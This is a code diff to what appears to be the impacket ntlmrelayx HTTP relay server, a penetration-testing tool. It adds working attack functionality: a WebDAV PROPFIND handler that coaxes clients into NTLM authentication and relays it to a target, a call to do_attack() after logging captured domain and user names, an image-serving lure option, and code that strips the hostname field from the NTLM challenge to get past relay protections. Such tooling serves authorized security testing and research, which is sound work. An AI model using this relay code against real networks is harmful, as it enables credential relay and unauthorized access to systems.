@@ -21,7 +21,7 @@ import random
 import struct
 import string
 from threading import Thread
-from six import PY2
+from six import PY2, b
 
 from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
@@ -59,7 +59,10 @@ class HTTPRelayServer(Thread):
                 if self.server.config.target is None:
                     # Reflection mode, defaults to SMB at the target, for now
                     self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
-                self.target = self.server.config.target.getTarget(self.server.config.randomtargets)
+                self.target = self.server.config.target.getTarget()
+                if self.target is None:
+                    LOG.info("HTTPD: Received connection from %s, but there are no more targets left!" % client_address[0])
+                    return
                 LOG.info("HTTPD: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
             try:
                 http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
@@ -90,7 +93,7 @@ class HTTPRelayServer(Thread):
             self.send_header('Content-type', 'application/x-ns-proxy-autoconfig')
             self.send_header('Content-Length',len(wpadResponse))
             self.end_headers()
-            self.wfile.write(wpadResponse)
+            self.wfile.write(b(wpadResponse))
             return
 
         def should_serve_wpad(self, client):
@@ -106,10 +109,78 @@ class HTTPRelayServer(Thread):
             else:
                 return False
 
+        def serve_image(self):
+            with open(self.server.config.serve_image, 'r+') as imgFile:
+                imgFile_data = imgFile.read()
+                self.send_response(200, "OK")
+                self.send_header('Content-type', 'image/jpeg')
+                self.send_header('Content-Length', str(len(imgFile_data)))
+                self.end_headers()
+                self.wfile.write(imgFile_data)
+
         def do_HEAD(self):
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
+
+        def do_OPTIONS(self):
+            self.send_response(200)
+            self.send_header('Allow',
+                             'GET, HEAD, POST, PUT, DELETE, OPTIONS, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK, MOVE, COPY')
+            self.send_header('Content-Length', '0')
+            self.send_header('Connection', 'close')
+            self.end_headers()
+            return
+
+        def do_PROPFIND(self):
+            proxy = False
+            if (".jpg" in self.path) or (".JPG" in self.path):
+                content = """<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+            else:
+                content = """<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+
+            messageType = 0
+            if PY2:
+                autorizationHeader = self.headers.getheader('Authorization')
+            else:
+                autorizationHeader = self.headers.get('Authorization')
+            if autorizationHeader is None:
+                self.do_AUTHHEAD(message=b'NTLM')
+                pass
+            else:
+                typeX = autorizationHeader
+                try:
+                    _, blob = typeX.split('NTLM')
+                    token = base64.b64decode(blob.strip())
+                except:
+                    self.do_AUTHHEAD()
+                messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]
+
+            if messageType == 1:
+                if not self.do_ntlm_negotiate(token, proxy=proxy):
+                    LOG.info("do negotiate failed, sending redirect")
+                    self.do_REDIRECT()
+            elif messageType == 3:
+                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
+                authenticateMessage.fromString(token)
+                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
+                        authenticateMessage['user_name'].decode('utf-16le')))
+                else:
+                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
+                        authenticateMessage['user_name'].decode('ascii')))
+                self.do_ntlm_auth(token, authenticateMessage)
+                self.do_attack()
+
+
+                self.send_response(207, "Multi-Status")
+                self.send_header('Content-Type', 'application/xml')
+                self.send_header('Content-Length', str(len(content)))
+                self.end_headers()
+                self.wfile.write(content)
+                return
 
         def do_AUTHHEAD(self, message = b'', proxy=False):
             if proxy:
@@ -250,6 +321,11 @@ class HTTPRelayServer(Thread):
 
                     self.do_attack()
 
+                    # Serve image and return 200 if --serve-image option has been set by user
+                    if (self.server.config.serve_image):
+                        self.serve_image()
+                        return
+
                     # And answer 404 not found
                     self.send_response(404)
                     self.send_header('WWW-Authenticate', 'NTLM')
@@ -266,6 +342,15 @@ class HTTPRelayServer(Thread):
                 if not self.client.initConnection():
                     return False
                 self.challengeMessage = self.client.sendNegotiate(token)
+
+                # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
+                if self.server.config.remove_target:
+                    av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
+                    del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
+                    self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
+                    self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
+                    self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
+
                 # Check for errors
                 if self.challengeMessage is False:
                     return False
